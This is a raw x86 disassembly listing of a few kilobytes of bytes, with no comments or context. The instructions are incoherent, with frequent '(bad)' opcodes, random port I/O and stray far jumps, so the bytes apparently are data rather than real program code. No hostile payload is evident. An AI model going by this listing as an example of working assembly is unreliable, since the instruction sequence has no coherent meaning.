  479241:	mov    al,0x1e
  479243:	aas    
  479244:	inc    edx
  479245:	adc    eax,0x9189350f
  47924a:	mov    dl,0x8f
  47924c:	and    WORD PTR [edi-0x35],0xeb1
  479252:	loopne 0x479270
  479254:	jg     0x479255
  479256:	mov    al,0xd9
  479258:	mov    ds:0x31a70ec6,eax
  47925d:	nop
  47925e:	cld    
  47925f:	pop    es
  479260:	in     eax,0x6d
  479262:	jo     0x47927c
  479264:	or     ebp,DWORD PTR [ecx+0x64]
  479267:	and    eax,0xe4ad085a
  47926c:	add    al,0x6e
  47926e:	out    0x1d,eax
  479270:	sub    eax,0xdb0708a5
  479275:	cmp    eax,0x704a74c2
  47927a:	xchg   ecx,eax
  47927b:	mov    esp,0x8a41886
  479280:	mov    DWORD PTR [ebp-0x38],ecx
  479283:	outs   dx,BYTE PTR ds:[esi]
  479284:	pop    edi
  479285:	xchg   BYTE PTR [ecx-0xf],al
  479288:	rol    edi,1
  47928a:	inc    esp
  47928b:	out    dx,al
  47928c:	iret   
  47928d:	lock dec ebx
  47928f:	or     dh,BYTE PTR [eax+eiz*1+0x1b30085d]
  479296:	mov    WORD PTR [eax+0x1b25b26b],fs
  47929c:	aam    0x56
  47929e:	adc    BYTE PTR [ebx],dl
  4792a0:	(bad)  [ebx+0x10f9110c]
  4792a6:	pop    ebx
  4792a7:	shl    DWORD PTR [ecx+0x10],0x38
  4792ab:	out    0x6b,al
  4792ad:	mov    esp,0x40103191
  4792b2:	push   ds
  4792b3:	scas   al,BYTE PTR es:[edi]
  4792b4:	outs   dx,BYTE PTR ds:[esi]
  4792b5:	jnp    0x47925e
  4792b7:	and    ch,cl
  4792b9:	(bad)  
  4792ba:	(bad)  
  4792bb:	dec    ebp
  4792bc:	je     0x479329
  4792be:	fs dec eax
  4792c0:	push   cs
  4792c1:	add    eax,0x296f2f45
  4792c6:	add    al,0x81
  4792c8:	push   edx
  4792c9:	mov    al,0x38
  4792cb:	add    al,0xf
  4792cd:	inc    esi
  4792ce:	or     BYTE PTR [ecx-0x38],bh
  4792d1:	xlat   BYTE PTR ds:[ebx]
  4792d2:	outs   dx,DWORD PTR ss:[esi]
  4792d4:	adc    BYTE PTR [eax-0x5c],0x17
  4792d8:	mov    bh,0xcb
  4792da:	inc    ebp
  4792db:	jge    0x4792b7
  4792dd:	cli    
  4792de:	pop    ebp
  4792df:	retf   0x18a1
  4792e2:	jb     0x479343
  4792e4:	pop    edi
  4792e5:	cmp    BYTE PTR [edi],bl
  4792e7:	nop
  4792e8:	div    BYTE PTR [ecx+esi*4]
  4792eb:	dec    esp
  4792ec:	mov    DWORD PTR [ecx+ecx*2],ebx
  4792ef:	or     edx,DWORD PTR [eax+edx*2+0x6]
  4792f3:	and    dh,ch
  4792f5:	jmp    0xb08c446a
  4792fa:	xchg   edi,eax
  4792fb:	mov    BYTE PTR [ecx],0xe8
  4792fe:	mov    dh,0xff
  479300:	inc    eax
  479301:	pop    edx
  479302:	inc    edx
  479303:	inc    ebp
  479304:	ret    0x335
  479307:	add    eax,0x186e7c7f
  47930c:	adc    DWORD PTR [edx],esi
  47930e:	psubusw mm1,QWORD PTR [edx+0x414562b]
  479315:	or     al,0x80
  479317:	push   cs
  479318:	js     0x479380
  47931a:	scas   al,BYTE PTR es:[edi]
  47931b:	xchg   ebx,eax
  47931c:	cmp    al,0x54
  47931e:	cmp    BYTE PTR [eax],al
  479320:	adc    al,0xb
  479322:	add    DWORD PTR [eax-0x4c],ebx
  479325:	pop    edi
  479326:	adc    dh,bh
  479328:	lods   eax,DWORD PTR ds:[esi]
  479329:	push   ebx
  47932a:	xchg   edi,eax
  47932b:	cmp    eax,0xd83ac87e
  479330:	gs sar bl,cl
  479333:	in     eax,dx
  479334:	sahf   
  479335:	dec    esi
  479336:	adc    BYTE PTR [ebx],bl
  479338:	jg     0x479312
  47933a:	ret    
  47933b:	das    
  47933c:	and    edx,DWORD PTR [eax+esi*2]
  47933f:	bound  ebx,QWORD PTR ds:0xfe1d7053
  479345:	bound  esp,QWORD PTR [ecx+0x128e1785]
  47934b:	add    BYTE PTR [ecx+0x45],dl
  47934e:	adc    al,0xff
  479350:	push   ebp
  479351:	pop    ds
  479352:	clc    
  479353:	jmp    0x1d49:0xe770fa04
  47935a:	data16 loop 0x47936d
  47935d:	out    0x13,eax
  47935f:	mov    edx,DWORD PTR [eax-0xa]
  479362:	dec    esi
  479363:	(bad)  
  479364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  479365:	jb     0x47932a
  479367:	pusha  
  479368:	mov    dl,0x7b
  47936a:	adc    al,0x9d
  47936c:	mov    ds:0x3ea79dde,al
  479371:	std    
  479372:	push   edx
  479373:	sbb    al,BYTE PTR [edi]
  479375:	imul   esp,edx,0x59
  479378:	sahf   
  479379:	dec    eax
  47937a:	jo     0x479381
  47937c:	nop
  47937d:	push   edi
  47937e:	pop    es
  47937f:	jg     0x47938f
  479381:	mov    BYTE PTR [eax+0x78],0x1
  479385:	adc    ecx,DWORD PTR [esi-0x3827dae0]
  47938b:	or     al,0x9c
  47938d:	stc    
  47938e:	jo     0x47933b
  479390:	hlt    
  479391:	mov    ecx,0xc6739504
  479396:	and    esi,eax
  479398:	fs je  0x479386
  47939b:	dec    ebp
  47939c:	push   cs
  47939d:	sub    ebx,DWORD PTR [ebx]
  47939f:	sti    
  4793a0:	and    DWORD PTR [ebp+ecx*2-0x3756c80c],0xf8383aa3
  4793ab:	jno    0x4793c4
  4793ad:	add    BYTE PTR [ecx-0x75],dh
  4793b0:	push   eax
  4793b1:	add    BYTE PTR [edi],0x83
  4793b4:	shl    BYTE PTR [ecx-0x7ba79284],0x1f
  4793bb:	scas   eax,DWORD PTR es:[edi]
  4793bc:	lock jle 0x479387
  4793bf:	test   BYTE PTR ds:0xfff8c87d,cl
  4793c5:	dec    ebx
  4793c6:	not    BYTE PTR [ecx+0x3a]
  4793c9:	mov    eax,ds:0xfc72602e
  4793ce:	pop    edx
  4793cf:	fs push esp
  4793d1:	fs cld 
  4793d3:	and    eax,esi
  4793d5:	inc    eax
  4793d6:	retf   0x5c02
  4793d9:	call   DWORD PTR [ebx+0x58]
  4793dc:	mov    ch,BYTE PTR [ebx]
  4793de:	add    bl,BYTE PTR [edi-0xe8a0a6]
  4793e4:	and    eax,0x81a907a0
  4793e9:	(bad)  
  4793ea:	ror    DWORD PTR [ecx],1
  4793ec:	add    dh,al
  4793ee:	sbb    ebx,DWORD PTR [ebx]
  4793f0:	pop    es
  4793f1:	ret    
  4793f2:	ret    
  4793f3:	and    cl,BYTE PTR [ebx-0x4f4fd704]
  4793f9:	and    ah,al
  4793fb:	lods   eax,DWORD PTR ds:[esi]
  4793fc:	inc    edi
  4793fd:	inc    edx
  4793fe:	addr16 jnp 0x47943b
  479401:	popa   
  479402:	pop    esi
  479403:	xor    dh,BYTE PTR [esi]
  479405:	in     eax,dx
  479406:	mov    eax,0x80383ca4
  47940b:	mov    bh,0x3d
  47940d:	adc    dh,BYTE PTR [edx+0x555c051d]
  479413:	repnz add BYTE PTR [edx+0xd],0x7
  479418:	jge    0x47943b
  47941a:	jnp    0x47945c
  47941c:	sub    ebx,ecx
  47941e:	jae    0x479440
  479420:	jb     0x4793d6
  479422:	jg     0x47942c
  479424:	jb     0x479453
  479426:	cmp    al,0x3b
  479428:	push   edi
  479429:	add    al,0x75
  47942b:	push   ss
  47942c:	push   cs
  47942d:	or     al,0x48
  47942f:	mov    ah,0x3d
  479431:	fmul   QWORD PTR [esi*2-0x11c4fef2]
  479438:	mov    ah,0x40
  47943a:	push   ds
  47943b:	repnz loope 0x479411
  47943e:	daa    
  47943f:	jb     0x479425
  479441:	cmp    ah,BYTE PTR [esi+0x40]
  479444:	fisub  WORD PTR [edi-0x2e]
  479447:	inc    ebx
  479448:	mov    DWORD PTR [ecx],eax
  47944a:	jns    0x4794ac
  47944c:	hlt    
  47944d:	cmp    dh,BYTE PTR [ebx+0x30]
  479450:	nop
  479451:	or     eax,0xcbb0a7cc
  479456:	sub    DWORD PTR ds:0x92766873,ebx
  47945c:	clc    
  47945d:	js     0x479467
  47945f:	dec    edi
  479460:	or     BYTE PTR [esp+edx*4-0xbce8eb9],0x6
  479468:	out    0x55,al
  47946a:	outs   dx,DWORD PTR ds:[esi]
  47946b:	fadd   DWORD PTR [ebx]
  47946d:	adc    al,BYTE PTR [esi]
  47946f:	cwde   
  479470:	xor    al,0xe6
  479472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479473:	imul   esp,DWORD PTR [edx-0x58],0xffffff84
  479477:	sub    DWORD PTR [eax],esp
  479479:	je     0x4794dc
  47947b:	mov    al,0x29
  47947d:	pusha  
  47947e:	sbb    cl,BYTE PTR ds:0x68bc65f4
  479484:	or     DWORD PTR [edi],0x3583ac4a
  47948a:	push   ebx
  47948b:	pop    edx
  47948c:	add    al,0xd
  47948e:	mul    BYTE PTR [ecx]
  479490:	sub    al,BYTE PTR fs:[ebp-0x74]
  479494:	out    dx,eax
  479495:	ins    BYTE PTR es:[edi],dx
  479496:	shl    dh,cl
  479498:	xor    DWORD PTR fs:[ebx],esi
  47949b:	leave  
  47949c:	xor    eax,0x8f02da32
  4794a1:	xchg   ebx,eax
  4794a2:	jo     0x479520
  4794a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4794a5:	inc    esi
  4794a6:	dec    edi
  4794a7:	scas   eax,DWORD PTR es:[edi]
  4794a8:	push   ecx
  4794a9:	adc    cl,al
  4794ab:	repnz lods eax,DWORD PTR ds:[esi]
  4794ad:	and    al,0x73
  4794af:	sbb    al,0x92
  4794b1:	ja     0x4794b6
  4794b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4794b4:	arpl   WORD PTR [eax+0x41],bp
  4794b7:	jae    0x4794f1
  4794b9:	push   esi
  4794ba:	jb     0x4794c9
  4794bc:	xchg   esi,eax
  4794bd:	clc    
  4794be:	addr16 inc edx
  4794c0:	(bad)  
  4794c2:	jne    0x479528
  4794c4:	cmp    BYTE PTR [eax+ebx*1],al
  4794c7:	enter  0xb813,0x90
  4794cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4794cc:	(bad)  
  4794cd:	adc    bl,dh
  4794cf:	aam    0x87
  4794d1:	adc    DWORD PTR [esi+0x27],edx
  4794d4:	add    al,0x44
  4794d6:	je     0x479503
  4794d8:	mov    eax,ds:0xf304cf74
  4794dd:	push   ss
  4794de:	xlat   BYTE PTR ds:[ebx]
  4794df:	es add eax,0x4f7bb809
  4794e5:	dec    esi
  4794e6:	jne    0x4794d5
  4794e8:	and    DWORD PTR [esi],edx
  4794ea:	ja     0x4794d4
  4794ec:	pop    esp
  4794ed:	or     DWORD PTR [esi+eax*2+0x259af41f],ecx
  4794f4:	outs   dx,DWORD PTR ds:[esi]
  4794f5:	pop    ebp
  4794f6:	adc    al,0xc2
  4794f8:	adc    eax,0xb6ed47ee
  4794fd:	cmc    
  4794fe:	add    DWORD PTR [ebx+0x28],edi
  479501:	or     al,0x97
  479503:	pop    ds
  479504:	clc    
  479505:	lods   eax,DWORD PTR ds:[esi]
  479506:	inc    ecx
  479507:	push   0x14
  479509:	movsx  ebx,WORD PTR [eax]
  47950c:	mov    esi,0x6e190920
  479511:	out    dx,al
  479512:	inc    ebx
  479513:	xor    ebp,ebp
  479515:	sbb    eax,0x8b02a806
  47951a:	xor    ch,dh
  47951c:	pop    ebx
  47951d:	dec    ebx
  47951e:	fwait
  47951f:	sti    
  479520:	test   eax,0x754b4537
  479525:	jecxz  0x4795a1
  479527:	xchg   BYTE PTR [edx-0x536f485c],bl
  47952d:	cmp    eax,0x3c09e859
  479532:	mov    esi,0x742db175
  479537:	xlat   BYTE PTR ds:[ebx]
  479538:	ins    BYTE PTR es:[edi],dx
  479539:	mov    al,ds:0x7c5b80dc
  47953e:	daa    
  47953f:	test   BYTE PTR [ebx],cl
  479541:	mov    ch,cl
  479543:	and    ch,ah
  479545:	je     0x479560
  479547:	sub    BYTE PTR [edx+0x5c5e017],al
  47954d:	and    esi,0xffffffd3
  479550:	dec    esp
  479551:	jl     0x47957e
  479553:	push   ebx
  479554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  479555:	xor    al,0x1d
  479557:	adc    al,0x32
  479559:	ret    0x7fcf
  47955c:	jne    0x4795b8
  47955e:	mov    edi,0x4a90d7ab
  479563:	fld    TBYTE PTR [ecx]
  479565:	pop    edi
  479566:	pop    esp
  479567:	call   DWORD PTR [ebx+0x465f2e50]
  47956d:	retf   
  47956e:	mov    esi,eax
  479570:	jmp    0x4795a8
  479572:	mov    edx,edi
  479574:	loope  0x47957b
  479576:	mov    al,0x4e
  479578:	jbe    0x4795a2
  47957a:	ja     0x479586
  47957c:	mov    eax,esi
  47957e:	jg     0x479540
  479580:	sbb    al,0xe
  479582:	mov    esp,0xd939c05a
  479587:	outs   dx,BYTE PTR ds:[esi]
  479588:	fst    DWORD PTR [esi+0x29]
  47958b:	retf   
  47958c:	add    BYTE PTR [edx-0x65],0x29
  479590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479591:	add    ecx,esp
  479593:	cmp    cl,BYTE PTR [esi-0x77]
  479596:	retf   0x331f
  479599:	mov    eax,ds:0xa5fc4866
  47959e:	or     ebx,ebx
  4795a0:	jne    0x479549
  4795a2:	mov    cl,0x5a
  4795a4:	rol    dh,0x5b
  4795a7:	ja     0xb0f504d5
  4795ad:	mov    ecx,DWORD PTR [ebx-0x6a]
  4795b0:	cmp    DWORD PTR [eax-0x5fe15f5b],0x14
  4795b7:	mov    ah,0x8d
  4795b9:	push   esp
  4795ba:	cmp    eax,0x9f312c5d
  4795bf:	xlat   BYTE PTR ds:[ebx]
  4795c0:	mov    al,0x34
  4795c2:	or     edi,esp
  4795c4:	cmp    al,0x9
  4795c6:	(bad)  
  4795c7:	xor    BYTE PTR [edx+0x13],al
  4795ca:	repnz fisttp DWORD PTR [eax]
  4795cd:	pop    edi
  4795ce:	jne    0x4795d1
  4795d0:	ficom  DWORD PTR [esi+0x3d]
  4795d3:	add    al,bh
  4795d5:	dec    eax
  4795d6:	jle    0x47961d
  4795d8:	push   ds
  4795d9:	mov    bl,BYTE PTR [eax]
  4795db:	pusha  
  4795dc:	and    eax,0x66690387
  4795e1:	jne    0x47965b
  4795e3:	or     eax,DWORD PTR [edi+0x78]
  4795e6:	pop    esi
  4795e7:	addr16 popf 
  4795e9:	inc    edi
  4795ea:	xchg   ebx,eax
  4795eb:	push   edi
  4795ec:	dec    ebp
  4795ed:	and    eax,0xe597760c
  4795f2:	clc    
  4795f3:	inc    esp
  4795f4:	lahf   
  4795f5:	popa   
  4795f6:	jne    0x479644
  4795f8:	pop    es
  4795f9:	cmp    esp,ecx
  4795fb:	jmp    0x47963f
  4795fd:	lods   eax,DWORD PTR ds:[esi]
  4795fe:	mov    bh,0x2f
  479600:	adc    DWORD PTR [edi-0x7c],0x73032cfe
  479607:	sub    DWORD PTR [edi-0x40],0xc69dac3b
  47960e:	adc    ecx,DWORD PTR [ebx]
  479610:	retf   
  479611:	jo     0x479683
  479613:	jmp    0x4795b6
  479615:	cdq    
  479616:	ss jnp 0x479605
  479619:	jno    0x4795f7
  47961b:	mov    DWORD PTR [esp+ebp*8+0x39],esi
  47961f:	js     0x479644
  479621:	mov    bl,0x48
  479623:	push   cs
  479624:	xor    eax,0x7613c331
  479629:	pop    ds
  47962a:	push   es
  47962b:	ss ret 0x1cb7
  47962f:	jbe    0x479688
  479631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  479632:	mov    ss,esp
  479634:	xchg   edx,eax
  479635:	ss test ah,ch
  479638:	and    al,0x32
  47963a:	ins    BYTE PTR es:[edi],dx
  47963b:	or     DWORD PTR [edi+0x47],0xc3b5056
  479642:	and    eax,0xf139c4cd
  479647:	daa    
  479648:	outs   dx,DWORD PTR ds:[esi]
  479649:	adc    al,0xb0
  47964b:	and    eax,DWORD PTR [eax+0x34]
  47964e:	popf   
  47964f:	les    eax,FWORD PTR [edx+0xfcc25f2]
  479655:	stos   BYTE PTR es:[edi],al
  479656:	cmp    eax,0x7d8f805a
  47965b:	xchg   edx,eax
  47965c:	dec    esi
  47965d:	lock sbb eax,0x8239ecf
  479663:	pop    esp
  479664:	shl    DWORD PTR ds:0xe440f684,cl
  47966a:	je     0x4796e0
  47966c:	or     al,ch
  47966e:	mov    ch,0x46
  479670:	mov    ebp,0x58415040
  479675:	nop
  479676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  479677:	xor    al,0xc5
  479679:	sbb    BYTE PTR [esi+0x41],dh
  47967c:	imul   esi,DWORD PTR [esi+0x50ed631e],0x359555f
  479686:	push   esp
  479687:	adc    bl,BYTE PTR [ebp-0x58b9036c]
  47968d:	test   DWORD PTR [ecx-0x1e],eax
  479690:	mov    ebx,0x55884fa8
  479695:	std    
  479696:	clc    
  479697:	cdq    
  479698:	pusha  
  479699:	ins    DWORD PTR es:[edi],dx
  47969a:	sbb    BYTE PTR [ebx+0x3],0x41
  47969e:	cmp    BYTE PTR [ebp-0x3],0x14
  4796a2:	cs jo  0x479640
  4796a5:	test   al,0x85
  4796a7:	cmp    al,0xd6
  4796a9:	int3   
  4796aa:	out    dx,al
  4796ab:	adc    eax,0x661c470e
  4796b0:	or     edx,DWORD PTR [esi-0x64]
  4796b3:	fs adc al,0xeb
  4796b6:	xor    edi,DWORD PTR [ebx+ebx*4-0x43]
  4796ba:	add    eax,0x66d0f72a
  4796bf:	and    ebp,DWORD PTR [eax]
  4796c1:	aaa    
  4796c2:	int3   
  4796c3:	ret    0xe35f
  4796c6:	add    eax,0x4ea76e17
  4796cb:	xchg   bh,dh
  4796cd:	add    DWORD PTR [ebp+0x9],esi
  4796d0:	ins    BYTE PTR es:[edi],dx
  4796d1:	push   es
  4796d2:	pop    ecx
  4796d3:	or     esi,ecx
  4796d5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4796d7:	call   0x8d37:0xa401b032
  4796de:	adc    al,0xff
  4796e0:	call   0xc466:0x7190a0e9
  4796e7:	fnstsw WORD PTR [ebx]
  4796e9:	imul   ebx,DWORD PTR [edx],0x3f
  4796ec:	pop    eax
  4796ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4796ee:	pushf  
  4796ef:	addr16 push esp
  4796f1:	pop    ecx
  4796f2:	test   BYTE PTR [ebx+0x65],dl
  4796f5:	sbb    BYTE PTR fs:[esi],ch
  4796f8:	pop    ss
  4796f9:	push   es
  4796fa:	popf   
  4796fb:	or     ah,0x91
  4796fe:	in     eax,dx
  4796ff:	stos   DWORD PTR es:[edi],eax
  479700:	cmp    DWORD PTR [ebx+esi*2+0x603b2930],0x1064f460
  47970b:	cdq    
  47970c:	int    0x4f
  47970e:	or     DWORD PTR [ebx-0xe],ebx
  479711:	push   eax
  479712:	sbb    al,0xbe
  479714:	js     0x4796c4
  479716:	jno    0x479761
  479718:	imul   ebp,DWORD PTR [eax+0x535b8359],0x3820fb30
  479722:	in     al,dx
  479723:	sub    DWORD PTR [esi+0x4c],esp
  479726:	push   0xffffffd9
  479728:	sti    
  479729:	loope  0x47976e
  47972b:	sbb    ecx,ebp
  47972d:	in     al,dx
  47972e:	xchg   ebp,eax
  47972f:	jo     0x479729
  479731:	imul   ecx,DWORD PTR [edx],0x5d341eba
  479737:	adc    al,0x6c
  479739:	mov    al,0x68
  47973b:	xchg   ebp,eax
  47973c:	in     al,dx
  47973d:	dec    esi
  47973e:	jno    0x479749
  479740:	dec    eax
  479741:	and    al,0xcb
  479743:	into   
  479744:	mov    esp,0xe058abe6
  479749:	pop    ds
  47974a:	iret   
  47974b:	push   esi
  47974c:	pop    ss
  47974d:	mov    esp,ebp
  47974f:	dec    ecx
  479750:	or     ebp,0xffffffed
  479753:	dec    eax
  479754:	sbb    al,0x1
  479756:	adc    eax,0x9020081
  47975b:	xchg   edx,eax
  47975c:	arpl   WORD PTR ds:0x485b60fb,di
  479762:	sub    BYTE PTR [ebp-0x7d],al
  479765:	retf   0x10ff
  479768:	and    al,0xeb
  47976a:	adc    BYTE PTR [ebx],cl
  47976c:	sbb    eax,0xc15117eb
  479771:	pop    edx
  479772:	lock sub DWORD PTR [edi],ebp
  479775:	(bad)  
  479776:	and    ecx,eax
  479778:	mov    cl,0xb5
  47977a:	mov    ecx,0x282e2357
  47977f:	je     0x479719
  479781:	xor    ebp,esp
  479783:	addr16 je 0x4797ca
  479786:	add    eax,0xd30d0e08
  47978b:	outs   dx,DWORD PTR ds:[esi]
  47978c:	pop    edi
  47978d:	pop    ds
  47978e:	pusha  
  47978f:	jns    0x4797a6
  479791:	je     0x4797f8
  479793:	mov    esp,0xb72c50bd
  479798:	mov    esi,0xd81edf8
  47979d:	scas   al,BYTE PTR es:[edi]
  47979e:	daa    
  47979f:	sbb    esp,esp
  4797a1:	sub    DWORD PTR [ecx],esi
  4797a3:	in     eax,0x5
  4797a5:	fst    DWORD PTR [edi+0x1cd44b69]
  4797ab:	adc    BYTE PTR [edi+ebx*1-0x50],dh
  4797af:	jns    0x4797a1
  4797b1:	(bad)  
  4797b2:	in     al,0x97
  4797b4:	or     BYTE PTR [ebx],bh
  4797b6:	jne    0x4797c4
  4797b8:	inc    ebp
  4797b9:	sub    BYTE PTR [edx+0x5f43e544],al
  4797bf:	cmp    al,0x98
  4797c1:	inc    edx
  4797c2:	dec    esi
  4797c3:	add    edi,DWORD PTR [edx-0x38]
  4797c6:	sub    esp,esp
  4797c8:	in     al,0x82
  4797ca:	adc    eax,0x81051493
  4797cf:	repnz cmp ah,BYTE PTR [esp+ebx*4-0x764a2720]
  4797d7:	pop    eax
  4797d8:	not    BYTE PTR [edx]
  4797da:	sub    ch,0x69
  4797dd:	test   al,0xf
  4797df:	sbb    BYTE PTR [ecx],ch
  4797e1:	xor    BYTE PTR [edx+0x2c],al
  4797e4:	inc    ebp
  4797e5:	mov    cl,0x7c
  4797e7:	push   edx
  4797e8:	sub    cl,BYTE PTR [edi-0x28]
  4797eb:	xchg   esp,eax
  4797ec:	push   ss
  4797ed:	aam    0x31
  4797ef:	cdq    
  4797f0:	(bad)  
  4797f1:	xor    esp,esp
  4797f3:	adc    ecx,esi
  4797f5:	ficomp WORD PTR [ebp+ecx*2+0x681a337c]
  4797fc:	mov    al,0xc0
  4797fe:	not    edi
  479800:	and    al,0xdb
  479802:	or     ebx,DWORD PTR [eax]
  479804:	add    DWORD PTR [eax-0x55],esi
  479807:	jl     0x4797f5
  479809:	adc    al,0x5a
  47980b:	or     ebp,DWORD PTR [edx]
  47980d:	dec    eax
  47980e:	in     al,0xad
  479810:	sub    al,0x74
  479812:	(bad)  
  479814:	nop
  479815:	dec    edx
  479816:	sti    
  479817:	adc    DWORD PTR [esi+eax*4],ebx
  47981a:	fcomp  DWORD PTR ds:0x61b030fc
  479820:	dec    esi
  479821:	aas    
  479822:	(bad)  
  479823:	push   ss
  479824:	imul   bl
  479826:	(bad)  
  479827:	fisub  DWORD PTR [eax-0x46]
  47982a:	je     0x479835
  47982c:	ins    BYTE PTR es:[edi],dx
  47982d:	imul   eax,DWORD PTR [ecx+ebx*2-0x4762a115],0xd4677f1b
  479838:	pop    ecx
  479839:	ss mov esi,0x920d1839
  47983f:	jl     0x4797c7
  479841:	js     0x47981e
  479843:	jnp    0x4797cc
  479845:	mov    bx,0x8fed
  479849:	xor    edx,DWORD PTR [eax]
  47984b:	pop    edi
  47984c:	push   ebp
  47984d:	mov    dl,0x1a
  47984f:	mov    eax,ds:0x182db460
  479854:	xchg   esi,eax
  479855:	pop    edi
  479856:	mov    bh,0xec
  479858:	pop    ecx
  479859:	popf   
  47985a:	jne    0x4797e7
  47985c:	push   0xb73b3ce4
  479861:	lods   eax,DWORD PTR ds:[esi]
  479862:	xor    BYTE PTR [ecx],bl
  479864:	int    0x1
  479866:	ins    BYTE PTR es:[edi],dx
  479867:	(bad)  
  479868:	jmp    0x21d:0xd28bd805
  47986f:	in     al,dx
  479870:	iret   
  479871:	in     al,dx
  479872:	cmp    ah,ah
  479874:	jb     0x4798a1
  479876:	adc    al,0x1c
  479878:	fwait
  479879:	add    ah,BYTE PTR [ebx+ecx*4-0x6e]
  47987d:	(bad)  
  47987e:	cmp    eax,0x14ec6087
  479883:	inc    ebx
  479884:	pusha  
  479885:	sbb    al,0xfd
  479887:	push   ebp
  479888:	xor    edx,edx
  47988a:	dec    ebp
  47988b:	dec    esp
  47988c:	rcr    ah,1
  47988e:	fisttp WORD PTR [esi-0x13741eeb]
  479894:	inc    ecx
  479895:	in     al,0x62
  479897:	adc    BYTE PTR [eax-0x7],0x15
  47989b:	or     edi,edx
  47989d:	loopne 0x4798c5
  47989f:	fnsave [edi]
  4798a1:	sub    al,0x47
  4798a3:	xor    al,0x40
  4798a5:	mov    ds:0x6b411d32,eax
  4798aa:	xchg   DWORD PTR [ecx-0x47c8a6c8],ebx
  4798b0:	sbb    BYTE PTR [edx+0x3388451c],bh
  4798b6:	scas   eax,DWORD PTR es:[edi]
  4798b7:	and    dl,BYTE PTR [ebp-0x57]
  4798ba:	js     0x479879
  4798bc:	jecxz  0x47984d
  4798be:	or     BYTE PTR [ecx-0x70],ah
  4798c1:	lods   eax,DWORD PTR ds:[esi]
  4798c2:	cmp    al,0x18
  4798c4:	mov    WORD PTR [eax],ss
  4798c6:	jmp    0x479920
  4798c8:	rcr    esp,1
  4798ca:	out    0xc0,al
  4798cc:	jns    0x47989e
  4798ce:	sub    al,0xe3
  4798d0:	fsub   DWORD PTR [ecx]
  4798d2:	out    0x14,al
  4798d4:	pop    ecx
  4798d5:	xor    bh,al
  4798d7:	dec    ebp
  4798d8:	push   esp
  4798d9:	jl     0x4798bf
  4798db:	fisttp QWORD PTR [esi+0x11fc9702]
  4798e1:	pop    eax
  4798e2:	pop    edi
  4798e3:	fstp   QWORD PTR [esi-0x2f3b2bcb]
  4798e9:	rol    DWORD PTR [ecx],1
  4798eb:	push   ebx
  4798ec:	dec    ebp
  4798ed:	xlat   BYTE PTR ds:[ebx]
  4798ee:	pusha  
  4798ef:	sub    BYTE PTR [edi-0x7c],0x30
  4798f3:	dec    edi
  4798f4:	jmp    0x4d980d2a
  4798f9:	xor    BYTE PTR ds:0x24cecec3,al
  4798ff:	and    al,0xd5
  479901:	ins    BYTE PTR es:[edi],dx
  479902:	aam    0xf
  479904:	bound  ebp,QWORD PTR [eax]
  479906:	fimul  DWORD PTR [eax+0xe]
  479909:	and    eax,0x5d7cd44b
  47990e:	mov    edi,0xd7426463
  479913:	push   edi
  479914:	out    0xeb,eax
  479916:	or     cl,BYTE PTR [esi+0x78]
  479919:	daa    
  47991a:	ins    BYTE PTR es:[edi],dx
  47991b:	cmp    edi,DWORD PTR [esi]
  47991d:	nop    DWORD PTR [ebx+0x64]
  479921:	daa    
  479922:	mov    esp,0xe4217ea
  479927:	sbb    edi,eax
  479929:	adc    DWORD PTR [eax+0x28e27d34],ebx
  47992f:	fadd   st(3),st
  479931:	call   0x3734:0xac86f2fb
  479938:	sub    al,0x9a
  47993a:	jge    0x479978
  47993c:	cld    
  47993d:	mov    esi,0x696ee006
  479942:	mov    DWORD PTR [eax+0x28],edi
  479945:	mov    ah,0x18
  479947:	jge    0x479961
  479949:	add    BYTE PTR [edx+0x64],dh
  47994c:	sti    
  47994d:	popa   
  47994e:	sub    dh,ah
  479950:	xor    edx,edx
  479952:	push   0x28
  479954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479955:	test   eax,0xa1f9863c
  47995a:	jge    0x479958
  47995c:	clc    
  47995d:	sbb    eax,DWORD PTR [edx-0xb0332cc]
  479963:	sub    BYTE PTR [ebx+0x420ec43d],dl
  479969:	pop    es
  47996a:	push   ebp
  47996b:	add    eax,0x22a19582
  479970:	outs   dx,BYTE PTR ds:[esi]
  479971:	aam    0x65
  479973:	mov    esp,0x3bff1182
  479978:	je     0x479965
  47997a:	sbb    dl,ah
  47997c:	mov    ecx,0xe126ec2c
  479981:	sub    al,0xd4
  479983:	dec    esi
  479984:	adc    bh,bl
  479986:	ins    BYTE PTR es:[edi],dx
  479987:	push   cs
  479988:	sbb    al,0x84
  47998a:	ficom  WORD PTR [eax]
  47998c:	inc    edx
  47998d:	pop    ss
  47998e:	nop
  47998f:	retf   
  479990:	and    al,0x6d
  479992:	xchg   ah,dh
  479994:	(bad)  
  479996:	mov    bl,0xf9
  479998:	jns    0x479928
  47999a:	add    al,0x8
  47999c:	add    al,0xd9
  47999e:	sbb    al,0xd9
  4799a0:	add    al,0xe4
  4799a2:	xor    cl,cl
  4799a4:	enter  0xf00c,0x10
  4799a8:	or     BYTE PTR [eax-0x62],dh
  4799ab:	add    edi,DWORD PTR [ecx+0x1c0c0820]
  4799b1:	adc    al,0x6c
  4799b3:	and    al,0xb6
  4799b5:	jl     0x479a35
  4799b7:	retf   0x1adf
  4799ba:	fisttp WORD PTR [edi+0x2aa13a04]
  4799c0:	add    BYTE PTR [edi+0x62648e40],ah
  4799c6:	lahf   
  4799c7:	adc    DWORD PTR [edx],ebx
  4799c9:	dec    eax
  4799ca:	popa   
  4799cb:	adc    al,0x94
  4799cd:	std    
  4799ce:	sahf   
  4799cf:	add    al,0xb6
  4799d1:	je     0x479982
  4799d3:	mov    DWORD PTR [ebx+0x3d],ebp
  4799d6:	pop    ds
  4799d7:	or     dl,bh
  4799d9:	or     eax,0x9e870f
  4799de:	mov    esi,0xf9417eeb
  4799e3:	sbb    DWORD PTR [edi+0x6],eax
  4799e6:	ror    BYTE PTR [edi+ecx*8],0x22
  4799ea:	add    bh,BYTE PTR [ecx-0x62]
